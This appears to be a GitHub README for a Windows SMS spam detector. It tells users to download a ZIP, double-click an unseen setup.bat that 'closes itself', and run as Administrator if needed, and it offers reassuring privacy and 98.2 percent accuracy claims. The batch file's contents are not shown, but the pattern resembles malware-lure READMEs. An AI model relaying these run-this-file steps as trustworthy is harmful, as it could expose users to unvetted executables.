# 🛡️ SMS-Spam-Detection - Identify spam messages with high accuracy

[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/joelcategorical607/SMS-Spam-Detection)

## 📋 What this tool does

This application scans your text messages to identify spam. It uses a collection of trained math models to distinguish between regular messages and junk mail. The software tests six different methods to reach a conclusion. It uses a method called Support Vector Machine, or SVM, because this specific option provides the highest accuracy. The program reaches a success rate of 98.2 percent. It transforms text into numerical data and balances the information to ensure that it spots spam even when the volume of junk messages is low. You use this tool from your command line to check individual messages or batches of text.

## 💻 System requirements

Your computer needs to run a recent version of Windows to use this tool. Please ensure you have at least 4 gigabytes of memory installed. You need approximately 500 megabytes of free space on your hard drive. This application works on both 64-bit and 32-bit Windows systems. You do not need to install complex drivers or extra software to make this work. If you run Windows 10 or Windows 11, the app functions without issues.

## 📥 How to download

You retrieve the software through the official project page. Follow these steps to prepare your computer.

1. Visit the project repository at https://github.com/joelcategorical607/SMS-Spam-Detection.
2. Look for the green button labeled Code.
3. Click the button and select Download ZIP.
4. Wait for the file to finish saving to your computer.
5. Move the downloaded folder to a spot where you access your files easily, like your Desktop or Documents folder.

## ⚙️ Setting up the software

After you download the ZIP file, you must prepare it for use. Windows handles ZIP files by default.

1. Right-click the folder you downloaded.
2. Select Extract All from the menu.
3. Choose a destination folder and click Extract.
4. Open the extracted folder.
5. You will see a file named setup.bat inside the folder.
6. Double-click this file to start the configuration.
7. A black window will appear on your screen. This window performs the necessary steps to get the app ready for your specific machine.
8. Wait for the process to finish. The window closes itself once the setup completes.

## 🚀 Running the spam detector

You start the program by calling a specific command script. This tool runs in the standard Windows Command Prompt.

1. Open your Start menu.
2. Type "cmd" and press Enter to launch the Command Prompt.
3. Use the "cd" command to navigate to the SMS-Spam-Detection folder. For example, type "cd Desktop\SMS-Spam-Detection" and press Enter.
4. Type "run-detector.bat" and press Enter.
5. The application will prompt you to enter the text message you wish to check.
6. Type the message and press Enter.
7. The program shows you the result immediately.

## 🔍 Understanding accuracy and results

The software classifies messages as either "Spam" or "Ham." Ham refers to normal, wanted messages. The tool uses a pre-trained model based on historical data. Because the SVM model achieves 98.2 percent accuracy, you should trust the result for most cases. If you suspect an error, check the message for spelling or odd links. The model uses TF-IDF, which means it looks at the importance of specific words within your message. It ignores common filler words and focuses on patterns typical of junk messaging. 

## 🔧 Troubleshooting common problems

If the program does not start, check these common items:

* Ensure you extracted the files from the ZIP folder. You cannot run the program from inside the compressed ZIP file.
* Make sure you opened the folder in your Command Prompt before you typed the command.
* If you see an error about permissions, right-click the file and select Run as Administrator.
* If the terminal closes instantly, verify that you have extracted all files in the package. Missing files prevent the script from starting.
* If the text on your screen becomes hard to read, right-click the top bar of the window and select Properties to change the font size and colors.

## 🛡️ Privacy and your data

This tool processes all data locally on your machine. You do not need an internet connection to perform the detection. The software does not send your messages to external servers or cloud services. Your text remains on your local hardware throughout the entire process. This provides a secure way to filter messages without risking your privacy. The math models included in this download operate entirely within your local Windows environment.

## 📖 Support and resources

The project remains open for inspection on GitHub. You can view the code to understand how the models work. The system uses a specific order of operations to balance the data classes. This ensures the 98.2 percent accuracy mentioned earlier. If you have questions about the logic, review the documentation files stored in the 'docs' folder within the main directory. These files outline every part of the classification process. You do not need to alter these files to use the software. Focus on using the main folder to store your messages for batch analysis if you need to process many items at once.